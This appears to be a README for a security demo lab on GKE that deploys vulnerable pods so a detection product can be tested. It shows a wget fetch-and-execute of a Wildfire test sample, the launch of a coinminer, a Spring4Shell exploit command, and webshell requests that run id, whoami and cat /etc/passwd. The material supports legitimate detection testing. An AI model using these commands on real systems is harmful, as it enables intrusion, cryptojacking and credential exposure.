# Spring4Shell and Coinminer PoC

## This is for testing and demo purpose
### Setup the vulnerable environment on GKE (Google Kubernetes Engine)
Apply for the provided YAML file:
```sh
$ kubectl apply -f jie_xdr_for_cloud_demo.yaml
pod/jie-spring4shell-pod created
pod/vulmachine-pod created
service/jie-sprig4shell created
```
Once the the 2 pods and 1 services are created successfully, use the following command to check the STATUS:
```sh
$ kubectl get all
```
![WebPage](screenshots/getAll.png?raw=true)

Now, you have 2 vulnerable pods. One is for coinminer and another one is for Spring4Shell


### Use cases
#### Get the malware sample from Wildfire and execute it
```sh
$ kubectl exec -it vulmachine-pod  -- /bin/bash
root@vulmachine-pod:/# wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/sample
--2023-04-24 03:19:40--  http://wildfire.paloaltonetworks.com/publicapi/test/elf
Resolving wildfire.paloaltonetworks.com (wildfire.paloaltonetworks.com)... 35.247.145.234
Connecting to wildfire.paloaltonetworks.com (wildfire.paloaltonetworks.com)|35.247.145.234|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8608 (8.4K) [application/octet-stream]
Saving to: '/tmp/sample'

/tmp/sample                                100%[======================================================================================>]   8.41K  --.-KB/s    in 0s      

2023-04-24 03:19:40 (56.4 MB/s) - '/tmp/sample' saved [8608/8608]

root@vulmachine-pod:/# chmod +x /tmp/sample 
root@vulmachine-pod:/# ./tmp/sample
```

#### Execute the coinminer
```sh
$ kubectl exec -it vulmachine-pod  -- /bin/bash
root@vulmachine-pod:/# ./tmp/coinminer
```

#### Exploit the Spring4Shell service
Check the output of the `kubectl get all` and find out the EXTERNAL-IP for your deployed service. Open your browser and connect to it.


![WebPage](screenshots/checkService.png?raw=true)

Once you see the above, you are good to exploit it.
```sh
$ python3 exploit.py --url "http://"your service external ip":8080/helloworld/greeting"
```
After above, websehll will be put on the server, you can use the following to execute the command to get id or /etc/passwd
```sh
$ http://"your service external ip":8080/webshell.jsp?cmd=id
$ http://"your service external ip":8080/webshell.jsp?cmd=cat%20/etc/passwd
$ http://"your service external ip":8080/webshell.jsp?cmd=whoami
```

## Credit
[@reznok](https://github.com/reznok/Spring4Shell-POC) for helping on building a spring4shell container image.
